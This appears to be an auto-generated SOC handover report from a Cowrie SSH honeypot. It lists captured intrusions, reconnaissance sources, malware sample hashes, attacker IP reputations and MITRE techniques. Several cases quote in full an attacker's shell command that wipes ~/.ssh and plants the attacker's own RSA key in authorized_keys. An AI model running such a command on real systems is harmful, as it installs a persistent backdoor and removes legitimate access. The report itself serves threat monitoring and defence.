| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 08:54:11` | `cowrie.session.connect` |
| `2026-04-30 08:54:11` | `cowrie.client.version` |
| `2026-04-30 08:54:11` | `cowrie.client.kex` |
| `2026-04-30 08:54:11` | `cowrie.login.success` |
| `2026-04-30 08:54:11` | `cowrie.session.params` |
| `2026-04-30 08:54:11` | `cowrie.command.input` |
| `2026-04-30 08:54:11` | `cowrie.command.failed` |
| `2026-04-30 08:54:11` | `cowrie.log.closed` |
| `2026-04-30 08:54:12` | `cowrie.session.params` |
| `2026-04-30 08:54:12` | `cowrie.command.input` |
| `2026-04-30 08:54:12` | `cowrie.session.file_download` |
| `2026-04-30 08:54:12` | `cowrie.log.closed` |
| `2026-04-30 08:54:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf288626e21c

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-04-30 08:54 |
| **Last Seen** | 2026-04-30 08:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 08:54:13` | `cowrie.session.connect` |
| `2026-04-30 08:54:13` | `cowrie.client.version` |
| `2026-04-30 08:54:13` | `cowrie.client.kex` |
| `2026-04-30 08:54:13` | `cowrie.login.success` |
| `2026-04-30 08:54:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6d422de9fa9

| Field | Detail |
|---|---|
| **Source IP** | `161.49.89[.]39` |
| **First Seen** | 2026-04-30 09:05 |
| **Last Seen** | 2026-04-30 09:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 09:05:50` | `cowrie.session.connect` |
| `2026-04-30 09:05:50` | `cowrie.client.version` |
| `2026-04-30 09:05:51` | `cowrie.client.kex` |
| `2026-04-30 09:05:51` | `cowrie.login.success` |
| `2026-04-30 09:05:51` | `cowrie.session.params` |
| `2026-04-30 09:05:51` | `cowrie.command.input` |
| `2026-04-30 09:05:51` | `cowrie.command.failed` |
| `2026-04-30 09:05:51` | `cowrie.log.closed` |
| `2026-04-30 09:05:52` | `cowrie.session.params` |
| `2026-04-30 09:05:52` | `cowrie.command.input` |
| `2026-04-30 09:05:52` | `cowrie.session.file_download` |
| `2026-04-30 09:05:52` | `cowrie.log.closed` |
| `2026-04-30 09:05:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.49.89[.]39` to AbuseIPDB if not already reported
- [ ] Block `161.49.89[.]39` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4db3c147a2fa

| Field | Detail |
|---|---|
| **Source IP** | `161.49.89[.]39` |
| **First Seen** | 2026-04-30 09:05 |
| **Last Seen** | 2026-04-30 09:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 09:05:53` | `cowrie.session.connect` |
| `2026-04-30 09:05:53` | `cowrie.client.version` |
| `2026-04-30 09:05:53` | `cowrie.client.kex` |
| `2026-04-30 09:05:54` | `cowrie.login.success` |
| `2026-04-30 09:05:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.49.89[.]39` to AbuseIPDB if not already reported
- [ ] Block `161.49.89[.]39` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dffd3a3f293

| Field | Detail |
|---|---|
| **Source IP** | `185.249.74[.]198` |
| **First Seen** | 2026-04-30 09:11 |
| **Last Seen** | 2026-04-30 09:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 09:11:07` | `cowrie.session.connect` |
| `2026-04-30 09:11:07` | `cowrie.client.version` |
| `2026-04-30 09:11:07` | `cowrie.client.kex` |
| `2026-04-30 09:11:08` | `cowrie.login.success` |
| `2026-04-30 09:11:08` | `cowrie.session.params` |
| `2026-04-30 09:11:08` | `cowrie.command.input` |
| `2026-04-30 09:11:08` | `cowrie.command.failed` |
| `2026-04-30 09:11:08` | `cowrie.log.closed` |
| `2026-04-30 09:11:08` | `cowrie.session.params` |
| `2026-04-30 09:11:08` | `cowrie.command.input` |
| `2026-04-30 09:11:09` | `cowrie.session.file_download` |
| `2026-04-30 09:11:09` | `cowrie.log.closed` |
| `2026-04-30 09:11:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.249.74[.]198` to AbuseIPDB if not already reported
- [ ] Block `185.249.74[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-038b0a99b716

| Field | Detail |
|---|---|
| **Source IP** | `185.249.74[.]198` |
| **First Seen** | 2026-04-30 09:11 |
| **Last Seen** | 2026-04-30 09:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 09:11:11` | `cowrie.session.connect` |
| `2026-04-30 09:11:11` | `cowrie.client.version` |
| `2026-04-30 09:11:11` | `cowrie.client.kex` |
| `2026-04-30 09:11:11` | `cowrie.login.success` |
| `2026-04-30 09:11:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.249.74[.]198` to AbuseIPDB if not already reported
- [ ] Block `185.249.74[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.210.21[.]225` | **30** | 2026-04-30 07:25 | 2026-04-30 08:06 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `139.59.112[.]10` | **30** | 2026-04-30 07:04 | 2026-04-30 07:52 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `185.249.74[.]198` | **30** | 2026-04-30 09:00 | 2026-04-30 09:33 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `43.160.200[.]19` | **30** | 2026-04-30 07:04 | 2026-04-30 07:43 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `121.168.139[.]251` | **25** | 2026-04-30 06:31 | 2026-04-30 07:18 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.76.243[.]197` | **24** | 2026-04-30 07:01 | 2026-04-30 07:21 | 34m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `148.76.24[.]165` | **13** | 2026-04-30 08:52 | 2026-04-30 09:09 | 26m | 0 | `T1592` | 🟠 MEDIUM |
| `49.207.40[.]162` | **13** | 2026-04-30 08:46 | 2026-04-30 10:07 | 0m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `185.92.182[.]129` | **2** | 2026-04-30 09:02 | 2026-04-30 10:09 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.96.194[.]210` | 1 | 2026-04-30 06:33 | 2026-04-30 06:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.245.138[.]57` | 1 | 2026-04-30 07:55 | 2026-04-30 07:55 | 14s | 0 | `T1592` | 🟢 LOW |
| `118.122.147[.]195` | 1 | 2026-04-30 08:49 | 2026-04-30 08:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.26.202[.]34` | 1 | 2026-04-30 08:10 | 2026-04-30 08:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.48.42[.]17` | 1 | 2026-04-30 08:46 | 2026-04-30 08:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.112[.]105` | 1 | 2026-04-30 07:02 | 2026-04-30 07:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `161.49.89[.]39` | 1 | 2026-04-30 09:05 | 2026-04-30 09:05 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.7.13[.]169` | 1 | 2026-04-30 10:00 | 2026-04-30 10:00 | 5s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]48` | 1 | 2026-04-30 08:57 | 2026-04-30 08:58 | 1s | 0 | `T1592` | 🟢 LOW |
| `35.202.9[.]133` | 1 | 2026-04-30 09:22 | 2026-04-30 09:22 | 10s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (25 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 40/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `120.26.202[.]34` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 5 |
| `183.7.13[.]169` | CN | CHINANET Guangdong province network | **100** ⚠️ | 0 |
| `185.92.182[.]129` | US | as56971 network | **100** ⚠️ | 37 |
| `121.168.139[.]251` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `35.202.9[.]133` | US | Google LLC | **100** ⚠️ | 50 |
| `148.76.24[.]165` | US | Optimum Online (Cablevision Systems) | **100** ⚠️ | 1 |
| `43.160.200[.]19` | SG | ACEVILLE PTE.LTD. | **100** ⚠️ | 50 |
| `118.122.147[.]195` | CN | CHINANET Sichuan province network | **100** ⚠️ | 50 |
| `185.247.137[.]48` | GB | Driftnet Ltd | **100** ⚠️ | 35 |
| `49.207.40[.]162` | IN | Beam Telecom Pvt Ltd | **100** ⚠️ | 41 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 209 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 164 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 19 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 9 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 9 |

---

## 🔕 False Positive Summary (123 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 40 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 24 |
| AbuseIPDB score 21 below threshold 25 | 21 |
| AbuseIPDB score 4 below threshold 25 | 12 |
| AbuseIPDB score 5 below threshold 25 | 3 |
| AbuseIPDB score 6 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 20 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 349 cases |
| Tool 34  | Credential Extractor        | ✅ 183 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 76 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 123 filtered (35.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 59 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 25 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 19 priority case(s) shown individually · 19 recon entry/entries in table (9 group(s) consolidating 197 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-30T10:10:54Z_
